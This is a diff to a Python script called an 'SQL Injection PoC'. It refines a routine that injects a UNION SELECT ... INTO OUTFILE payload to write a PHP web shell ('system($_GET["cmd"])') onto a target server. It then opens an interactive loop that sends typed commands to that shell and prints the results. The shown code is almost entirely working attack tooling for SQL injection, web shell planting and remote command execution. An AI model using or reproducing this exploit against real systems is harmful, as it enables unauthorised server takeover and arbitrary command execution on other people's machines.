@@ -34,7 +34,6 @@ def exploit(url, param, payload):
             output("output.txt", f"Response time: {response_time:.2f} seconds\n")
             output("output.txt", f"Payload used: {payload}\n\n")
             output("output.txt", f"Text: {text}\n\n")
-
         else:
             print(f"[-] Web request error: {status_code}...\n")
             return False
@@ -54,23 +53,20 @@ def shell_mode(url, param):
     for path in paths:
         payload = f"' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile '{path}shell.php' #"
         if exploit(url, param, payload):
-            print("[+] Webshell successfully uploaded. Entering shell mode...\n")
+            print(f"[+] Webshell successfully uploaded to {path}shell.php. Entering shell mode...\n")
+            web_shell = f"{url}/shell.php?cmd="
             while True:
                 shell = input("$ ")
-                web_shell = f"{url}/shell.php?cmd="
                 full_url = web_shell + shell
 
                 try:
                     response = requests.get(full_url)
                     print(response.text)
-                    continue
-
                 except requests.RequestException as e:
                     print(f"[-] Error: {e}\n")
                     break
-
-        else:
-            print("[-] Webshell not uploaded. Check output.txt for analysis...")
+            return
+    print("[-] Webshell not uploaded. Check output.txt for analysis...")
 
 def main():
     parser = argparse.ArgumentParser(description="SQL Injection PoC")
@@ -91,7 +87,7 @@ def main():
     for payload in payloads:
         exploit(url, args.param, payload)
 
-    shell_mode(url, args.param, payload)
+    shell_mode(url, args.param)
 
 if __name__ == "__main__":
     main()
